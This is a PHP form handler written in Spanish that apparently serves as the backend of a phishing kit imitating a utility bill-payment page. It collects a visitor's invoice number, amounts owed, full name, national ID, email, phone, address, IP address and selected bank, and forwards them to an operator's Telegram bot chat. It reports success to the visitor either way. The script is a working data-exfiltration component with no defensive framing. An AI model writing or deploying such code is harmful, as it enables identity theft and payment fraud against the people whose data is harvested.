<?php
header('Content-Type: application/json');
$config = include 'config.php';

// Get JSON input
$input = file_get_contents('php://input');
$data = json_decode($input, true);

if (!$data) {
    echo json_encode(['status' => 'error', 'message' => 'No data received']);
    exit;
}

// Telegram credentials
$botToken = $config['botToken'];
$chatId = $config['chatId'];

// Escape for MarkdownV2
function escapeMarkdownV2($text)
{
    if ($text === null)
        return '';
    $specialChars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'];
    foreach ($specialChars as $char) {
        $text = str_replace($char, "\\" . $char, $text);
    }
    return $text;
}

// Format message
$message = "📄 *Consulta de Factura y Datos del Cliente*\n\n";

// Invoice Info
$message .= "🧾 *Datos de la Factura:*\n";
$message .= "• *NIC/Cupón:* `" . escapeMarkdownV2($data['nic']) . "`\n";
$message .= "• *Valor Mes:* `" . escapeMarkdownV2($data['valorMes']) . "`\n";
$message .= "• *Deuda Total:* `" . escapeMarkdownV2($data['deudaTotal']) . "`\n";
if (!empty($data['paymentType'])) {
    $message .= "• *Concepto Pago:* `" . escapeMarkdownV2($data['paymentType']) . "`\n";
}
if (!empty($data['totalPagar'])) {
    $message .= "• *Total a Pagar:* `" . escapeMarkdownV2($data['totalPagar']) . "`\n";
}
$message .= "\n";

// Customer Info
$message .= "👤 *Datos del Cliente:*\n";
$message .= "• *Nombre:* `" . escapeMarkdownV2($data['nombre']) . "`\n";
$message .= "• *ID:* `" . escapeMarkdownV2($data['identificacion']) . "`\n";
$message .= "• *Email:* `" . escapeMarkdownV2($data['email']) . "`\n";
$message .= "• *Teléfono:* `" . escapeMarkdownV2($data['telefono']) . "`\n";
$message .= "• *Dirección:* `" . escapeMarkdownV2($data['direccion']) . "`\n";
$message .= "• *IP:* `" . escapeMarkdownV2($_SERVER['REMOTE_ADDR']) . "`\n";

if (!empty($data['banco'])) {
    $message .= "\n🏦 *Banco Seleccionado:* `" . escapeMarkdownV2(strtoupper($data['banco'])) . "`";
}

// Send to Telegram
$url = "https://api.telegram.org/bot$botToken/sendMessage";
$postData = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'MarkdownV2'
];

$options = [
    'http' => [
        'header' => "Content-type: application/x-www-form-urlencoded\r\n",
        'method' => 'POST',
        'content' => http_build_query($postData),
        'ignore_errors' => true
    ]
];

$context = stream_context_create($options);
$result = file_get_contents($url, false, $context);

// Log errors
if (strpos($http_response_header[0], '200') === false) {
    file_put_contents('telegram_invoice_log.txt', date('Y-m-d H:i:s') . " Error: " . $result . "\n", FILE_APPEND);
}

echo json_encode(['status' => 'success']);
?>